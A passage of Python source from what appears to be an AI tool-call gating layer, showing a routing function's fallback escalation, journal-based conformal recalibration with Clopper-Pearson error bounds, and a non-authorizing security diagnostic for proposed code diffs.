                    verified_errors=verified_errs,
                    confidence_level=conf_level,
                    sample_id=sample_id,
                    decision_kind="routing_recommendation",
                    error_metric=err_metric,
                )
            return _finish(
                "allow",
                moe_res.selected_tool,
                [moe_res.selected_tool],
                "layer2_conformal_singleton",
                2,
                conformal_bound=cal_bound_95,
                upper_error_bound=cal_bound_active,
                calibration_basis=cal_basis,
                verified_episodes=verified_eps,
                verified_errors=verified_errs,
                confidence_level=conf_level,
                sample_id=sample_id,
                decision_kind="routing_recommendation",
                error_metric=err_metric,
            )
        except Exception as exc:
            # Fail safe: escalate to Layer 3 LLM rather than returning a fake constant
            return _finish("escalate", "unknown", [], f"layer2_unavailable:{type(exc).__name__}", 3, calibration_basis="unavailable_fallback")

    # --- Layer 3: Fallback Escalation ---
    return _finish("escalate", "ambiguous", [], "layer3_default_escalation", 3, calibration_basis="unavailable_fallback")


def recalibrate_from_decision_journal(
    journal_entries: Optional[Sequence[Dict[str, Any]]] = None,
    alpha: float = 0.05,
    journal_path: Optional[Union[Path, str]] = None,
    error_metric: str = "verified_decision_error",
    sample_id: Optional[str] = None,
) -> Dict[str, Any]:
    """Consume logged decision episodes to compute operational telemetry, failure bounds,
    and updated split-conformal quantiles when labeled nonconformity feedback is present.
    """
    entries: List[Dict[str, Any]] = []
    if journal_entries is not None:
        entries = [dict(e) for e in journal_entries if isinstance(e, dict)]
    else:
        target = Path(journal_path) if journal_path else DEFAULT_JOURNAL_PATH
        if _DECISION_RING_BUFFER:
            entries = list(_DECISION_RING_BUFFER)
        elif target.is_file():
            try:
                for ln in target.read_text(encoding="utf-8", errors="ignore").splitlines():
                    ln_str = ln.strip()
                    if ln_str:
                        try:
                            entries.append(json.loads(ln_str))
                        except Exception:
                            continue
            except Exception:
                entries = []

    decision_counts = {"allow": 0, "deny": 0, "escalate": 0}
    layer_counts: Dict[int, int] = {}
    latencies: List[float] = []
    nonconf_scores: List[float] = []
    verified_total = 0
    verified_errors = 0

    for item in entries:
        dec = str(item.get("decision", "escalate"))
        decision_counts[dec] = decision_counts.get(dec, 0) + 1
        lyr = int(item.get("layer", 0))
        layer_counts[lyr] = layer_counts.get(lyr, 0) + 1
        if "latency_ms" in item:
            latencies.append(float(item["latency_ms"]))
        if "verified_correct" in item:
            verified_total += 1
            if not bool(item["verified_correct"]):
                verified_errors += 1
        if "nonconformity_score" in item:
            nonconf_scores.append(float(item["nonconformity_score"]))

    n_total = len(entries)
    sorted_lat = sorted(latencies)
    mean_lat = round(sum(latencies) / float(len(latencies)), 4) if latencies else 0.0
    p95_lat = round(sorted_lat[int(len(sorted_lat) * 0.95)], 4) if sorted_lat else 0.0
    escalation_rate = round(decision_counts.get("escalate", 0) / float(max(1, n_total)), 4) if n_total else 0.0

    from .analytical_micro_transformer import AnalyticalMicroTransformer

    upper_bound: Optional[float] = None
    upper_bound_95: Optional[float] = None
    if verified_total > 0:
        upper_bound = AnalyticalMicroTransformer.compute_clopper_pearson_upper_bound(
            verified_errors,
            verified_total,
            alpha=float(alpha),
        )
        upper_bound_95 = AnalyticalMicroTransformer.compute_clopper_pearson_upper_bound(
            verified_errors,
            verified_total,
            alpha=0.05,
        )
        conf_status = "verified"
    else:
        conf_status = "unknown"

    recalibrated_q_hat: Optional[float] = None
    router_updated = False
    if len(nonconf_scores) >= 19:
        sorted_scores = sorted(nonconf_scores)
        q_idx = min(len(sorted_scores) - 1, max(0, math.ceil((len(sorted_scores) + 1) * (1.0 - float(alpha))) - 1))
        recalibrated_q_hat = round(float(sorted_scores[q_idx]), 4)
        try:
            from .tool_routing_moe import get_tool_routing_moe

            moe = get_tool_routing_moe()
            bounded_q = max(0.05, min(0.85, float(recalibrated_q_hat)))
            for exp_name in moe.per_expert_quantiles:
                moe.per_expert_quantiles[exp_name] = round(0.5 * float(moe.per_expert_quantiles[exp_name]) + 0.5 * bounded_q, 4)
            router_updated = True
        except Exception:
            router_updated = False

    resolved_sample_id = sample_id or (
        f"journal_{verified_total}" if verified_total > 0 else (f"journal_scores_{len(nonconf_scores)}" if nonconf_scores else None)
    )
    if verified_total > 0 or router_updated:
        try:
            from .tool_routing_moe import get_tool_routing_moe

            moe = get_tool_routing_moe()
            moe.verified_episodes = int(verified_total)
            moe.verified_errors = int(verified_errors)
            moe.calibration_alpha = float(alpha)
            moe.recalibrated_from_journal = bool(router_updated)
            moe.calibration_basis = "recalibrated_journal" if router_updated else "measured_journal"
            moe.calibration_sample_id = resolved_sample_id
            moe.error_metric = str(error_metric) if verified_total > 0 else "unmeasured"
        except Exception:
            pass

    return {
        "n_episodes": n_total,
        "decision_counts": decision_counts,
        "layer_counts": layer_counts,
        "escalation_rate": escalation_rate,
        "mean_latency_ms": mean_lat,
        "p95_latency_ms": p95_lat,
        "verified_episodes": verified_total,
        "verified_errors": verified_errors,
        "upper_error_bound": upper_bound,
        "upper_error_bound_95": upper_bound_95,
        "confidence_level": round(1.0 - float(alpha), 4),
        "statistical_confidence_status": conf_status,
        "error_metric": str(error_metric) if verified_total > 0 else "unmeasured",
        "sample_id": resolved_sample_id,
        "recalibrated_q_hat": recalibrated_q_hat,
        "router_updated": router_updated,
        "alpha": float(alpha),
    }


def diagnose_patch(
    path: Optional[str],
    diff_text: str,
    original_source: Optional[str] = None,
    policy: Optional[PolicyConfig] = None,
) -> Dict[str, Any]:
    """Decoupled structural & security diagnostic advisor for proposed code diffs.

    Inspects protected paths, Python/JSON/JS/YAML syntax & security sinks, interface
    hazards, hunk completeness, and optional strict AST allowlists without emitting an
    authorization verdict (`authorizes_execution=False`).
    """
    t0 = time.perf_counter_ns()
    cfg = policy or DEFAULT_POLICY
    diff_str = str(diff_text or "")
    protected = is_protected_path(path, cfg)

    if not diff_str.strip():
        return {
            "status": "policy_blocked_path" if protected else "empty_diff",
            "authorizes_execution": False,
            "path": path,
            "protected_path": protected,
            "syntax_valid": True,
            "security_clean": not protected,
            "hunk_only_checked": False,
            "line_count": 0,
            "findings": ["protected_path"] if protected else [],
            "interface_hazards": [],
            "imported_modules": [],
            "dynamic_calls": [],
            "strict_ast_warnings": [],
            "latency_ms": round((time.perf_counter_ns() - t0) / 1_000_000.0, 4),
        }

    is_hunk_without_source = (
        original_source is None
        and ("@@" in diff_str or diff_str.lstrip().startswith(("diff --git", "--- ", "+++ ")))
    )
    diff_res = analyze_code_diff(path, diff_str, original_source=original_source)
    findings = [redact_secrets(f) for f in diff_res.get("findings", [])]
    if protected and "protected_path" not in findings:
        findings.insert(0, "protected_path")

    strict_warnings: List[str] = []
    if cfg.strict_ast_allowlist and diff_res.get("language") == "python":
        allowed_mods = set(cfg.allowed_ast_imports)
        for mod in diff_res.get("imported_modules", []):
            if mod not in allowed_mods:
                strict_warnings.append(f"unapproved_import:{mod}")
        for dyn in diff_res.get("dynamic_calls", []):
            strict_warnings.append(f"dynamic_call:{dyn}")

    hunk_only_checked = bool(is_hunk_without_source and not diff_res.get("patched_file_ast_verified", False))
    needs_source = bool(diff_res.get("partial_hunk_needs_source") or (is_hunk_without_source and cfg.require_full_source_for_allow))

    if protected:
        status = "policy_blocked_path"
    elif not diff_res.get("security_clean", True) or not diff_res.get("syntax_valid", True):
        status = "findings_detected"
    elif needs_source:
        status = "needs_full_source"
    elif diff_res.get("line_count", 0) > cfg.max_diff_lines or strict_warnings or diff_res.get("interface_hazards"):
        status = "warnings_detected"
    else:
        status = "clean"

    return {
        "status": status,
        "authorizes_execution": False,
        "path": path,
        "language": diff_res.get("language", "unknown"),
        "protected_path": protected,
        "syntax_valid": bool(diff_res.get("syntax_valid", True)),
        "security_clean": bool(diff_res.get("security_clean", True)) and not protected,
        "hunk_only_checked": hunk_only_checked,
        "patched_file_ast_verified": bool(diff_res.get("patched_file_ast_verified", False)),
        "line_count": int(diff_res.get("line_count", 0)),
        "findings": findings,
        "interface_hazards": list(diff_res.get("interface_hazards", [])),
        "imported_modules": list(diff_res.get("imported_modules", [])),
        "dynamic_calls": list(diff_res.get("dynamic_calls", [])),
        "strict_ast_warnings": strict_warnings,
        "is_static_data_or_doc": bool(diff_res.get("is_static_data_or_doc", False)),
        "latency_ms": round((time.perf_counter_ns() - t0) / 1_000_000.0, 4),
    }
